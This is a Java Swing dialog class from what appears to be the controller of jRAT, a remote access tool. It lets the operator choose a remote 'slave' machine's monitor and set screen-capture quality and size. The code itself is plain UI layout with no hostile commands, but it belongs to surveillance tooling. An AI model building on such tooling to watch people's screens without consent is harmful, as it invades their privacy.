package io.jrat.controller.ui.dialogs;

import graphslib.monitors.RemoteMonitor;
import iconlib.IconUtils;
import io.jrat.controller.Slave;
import io.jrat.controller.listeners.PickMonitorListener;
import io.jrat.controller.ui.frames.FrameRemoteScreen;
import io.jrat.controller.ui.renderers.JComboBoxIconRenderer;

import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.util.HashMap;
import java.util.Map;

import javax.swing.BorderFactory;
import javax.swing.DefaultComboBoxModel;
import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JComboBox;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JSlider;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.border.EmptyBorder;
import javax.swing.event.ChangeEvent;
import javax.swing.event.ChangeListener;


@SuppressWarnings("serial")
public class DialogMonitors extends BaseDialog {

	public static final Map<Slave, DialogMonitors> instances = new HashMap<Slave, DialogMonitors>();

	private JPanel contentPane;
	private FrameRemoteScreen parent;
	private JComboBox<String> cbMonitors;
	private JComboBoxIconRenderer renderer;
	private JPanel panel_1;
	private JSlider slQuality;
	private JSlider sdSize;
	private JLabel lblResize;

	public DefaultComboBoxModel<String> getModel() {
		return (DefaultComboBoxModel<String>) cbMonitors.getModel();
	}

	public JComboBoxIconRenderer getRenderer() {
		return renderer;
	}

	public DialogMonitors(FrameRemoteScreen p, Slave sl) {
		super(sl);
		setModal(true);
		this.parent = p;

		addWindowListener(new WindowAdapter() {
			@Override
			public void windowClosing(WindowEvent arg0) {
				exit();
			}
		});
		instances.put(sl, this);
		setIconImage(Toolkit.getDefaultToolkit().getImage(DialogMonitors.class.getResource("/icons/screen.png")));
		setTitle("Monitors");
		setResizable(false);
		setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
		setBounds(100, 100, 271, 339);
		contentPane = new JPanel();
		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
		setContentPane(contentPane);

		JPanel panel = new JPanel();
		panel.setBorder(BorderFactory.createTitledBorder("Monitors"));

		panel_1 = new JPanel();
		panel_1.setBorder(BorderFactory.createTitledBorder("Other"));

		JButton btnOpen = new JButton("Open");
		btnOpen.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				parent.setMonitor(cbMonitors.getSelectedIndex() - 1);
				parent.setQuality(slQuality.getValue());
				parent.setImageSize(sdSize.getValue());
				
				parent.getCbMonitors().setSelectedIndex(cbMonitors.getSelectedIndex());
				parent.getSliderQuality().setValue(slQuality.getValue());
				parent.getSliderSize().setValue(sdSize.getValue());
				
				setVisible(false);
				dispose();
			}
		});
		btnOpen.setIcon(IconUtils.getIcon("monitor-arrow"));

		JButton btnCancel = new JButton("Cancel");
		btnCancel.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				parent.setVisible(false);
				parent.dispose();
				setVisible(false);
				dispose();
				instances.remove(slave);
			}
		});
		btnCancel.setIcon(IconUtils.getIcon("monitor-minus"));
		GroupLayout gl_contentPane = new GroupLayout(contentPane);
		gl_contentPane.setHorizontalGroup(gl_contentPane.createParallelGroup(Alignment.TRAILING).addGroup(gl_contentPane.createSequentialGroup().addContainerGap(60, Short.MAX_VALUE).addComponent(btnCancel).addPreferredGap(ComponentPlacement.RELATED).addComponent(btnOpen).addContainerGap()).addGroup(Alignment.LEADING, gl_contentPane.createSequentialGroup().addGroup(gl_contentPane.createParallelGroup(Alignment.TRAILING).addComponent(panel, Alignment.LEADING, GroupLayout.DEFAULT_SIZE, 236, Short.MAX_VALUE).addComponent(panel_1, Alignment.LEADING, GroupLayout.DEFAULT_SIZE, GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)).addGap(5)));
		gl_contentPane.setVerticalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addComponent(panel, GroupLayout.PREFERRED_SIZE, 126, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.RELATED).addComponent(panel_1, GroupLayout.PREFERRED_SIZE, 125, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.UNRELATED).addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE).addComponent(btnOpen).addComponent(btnCancel)).addContainerGap(GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)));

		JLabel lblQuality = new JLabel("Quality");
		lblQuality.setIcon(IconUtils.getIcon("monitor-plus"));

		slQuality = new JSlider();
		slQuality.setMinorTickSpacing(1);
		slQuality.setPaintTicks(true);
		slQuality.setSnapToTicks(true);
		slQuality.setValue(5);
		slQuality.setMaximum(10);
		GroupLayout gl_panel_1 = new GroupLayout(panel_1);
		gl_panel_1.setHorizontalGroup(
			gl_panel_1.createParallelGroup(Alignment.LEADING)
				.addGroup(gl_panel_1.createSequentialGroup()
					.addContainerGap()
					.addComponent(lblQuality, GroupLayout.DEFAULT_SIZE, 61, Short.MAX_VALUE)
					.addPreferredGap(ComponentPlacement.RELATED)
					.addComponent(slQuality, GroupLayout.PREFERRED_SIZE, 140, GroupLayout.PREFERRED_SIZE)
					.addContainerGap())
		);
		gl_panel_1.setVerticalGroup(
			gl_panel_1.createParallelGroup(Alignment.TRAILING)
				.addGroup(gl_panel_1.createSequentialGroup()
					.addGroup(gl_panel_1.createParallelGroup(Alignment.LEADING)
						.addComponent(lblQuality, GroupLayout.PREFERRED_SIZE, 25, GroupLayout.PREFERRED_SIZE)
						.addComponent(slQuality, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE))
					.addGap(87))
		);
		panel_1.setLayout(gl_panel_1);

		cbMonitors = new JComboBox<String>();
		cbMonitors.setModel(new DefaultComboBoxModel<String>());
		renderer = new JComboBoxIconRenderer();
		cbMonitors.setRenderer(renderer);

		JButton btnReload = new JButton("Reload");
		btnReload.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				reload();
			}
		});
		btnReload.setIcon(IconUtils.getIcon("monitor-arrow"));

		lblResize = new JLabel("Size 50%");
		lblResize.setIcon(IconUtils.getIcon("application-resize"));

		sdSize = new JSlider();
		sdSize.setMinorTickSpacing(5);
		sdSize.setSnapToTicks(true);
		sdSize.setMinimum(25);
		sdSize.addChangeListener(new ChangeListener() {
			public void stateChanged(ChangeEvent arg0) {
				lblResize.setText("Size " + sdSize.getValue() + "%");
			}
		});
		sdSize.setPaintTicks(true);
		
		JButton btnPick = new JButton("Pick");
		btnPick.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				DialogPickMonitor dpm = new DialogPickMonitor(slave, new PickMonitorListener() {
					@Override
					public void monitorPick(RemoteMonitor monitor) {
						for (int i = 0; i < cbMonitors.getItemCount(); i++) {
							if (getModel().getElementAt(i).equalsIgnoreCase(monitor.getLabel())) {
								cbMonitors.setSelectedIndex(i);
								break;
							}
						}
					}	
				});
				dpm.setModal(true);
				dpm.setVisible(true);
			}
		});
		GroupLayout gl_panel = new GroupLayout(panel);
		gl_panel.setHorizontalGroup(
			gl_panel.createParallelGroup(Alignment.TRAILING)
				.addGroup(gl_panel.createSequentialGroup()
					.addContainerGap()
					.addGroup(gl_panel.createParallelGroup(Alignment.TRAILING)
						.addComponent(cbMonitors, 0, 218, Short.MAX_VALUE)
						.addGroup(gl_panel.createSequentialGroup()
							.addComponent(btnPick)
							.addPreferredGap(ComponentPlacement.RELATED)
							.addComponent(btnReload))
						.addGroup(gl_panel.createSequentialGroup()
							.addComponent(lblResize, GroupLayout.DEFAULT_SIZE, 70, Short.MAX_VALUE)
							.addPreferredGap(ComponentPlacement.RELATED)
							.addComponent(sdSize, GroupLayout.PREFERRED_SIZE, 144, GroupLayout.PREFERRED_SIZE)))
					.addContainerGap())
		);
		gl_panel.setVerticalGroup(
			gl_panel.createParallelGroup(Alignment.LEADING)
				.addGroup(gl_panel.createSequentialGroup()
					.addContainerGap()
					.addComponent(cbMonitors, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
					.addPreferredGap(ComponentPlacement.RELATED)
					.addGroup(gl_panel.createParallelGroup(Alignment.BASELINE)
						.addComponent(btnReload)
						.addComponent(btnPick))
					.addPreferredGap(ComponentPlacement.UNRELATED)
					.addGroup(gl_panel.createParallelGroup(Alignment.LEADING)
						.addComponent(lblResize, GroupLayout.PREFERRED_SIZE, 25, GroupLayout.PREFERRED_SIZE)
						.addComponent(sdSize, GroupLayout.PREFERRED_SIZE, 31, GroupLayout.PREFERRED_SIZE))
					.addContainerGap(GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
		);
		panel.setLayout(gl_panel);
		contentPane.setLayout(gl_contentPane);

		setLocationRelativeTo(null);

		reload();
	}

	public void reload() {
		getModel().removeAllElements();
		getModel().addElement("Default");
		getRenderer().addIcon("default", IconUtils.getIcon("monitor-arrow"));

		ImageIcon icon = IconUtils.getIcon("monitor");

		for (RemoteMonitor monitor : slave.getMonitors()) {
			getRenderer().addIcon(monitor.getLabel(), icon);
			getModel().addElement(monitor.getLabel());
		}
	}

	public void exit() {
		parent.setVisible(false);
		parent.dispose();
		setVisible(false);
		dispose();
		instances.remove(slave);
	}
}
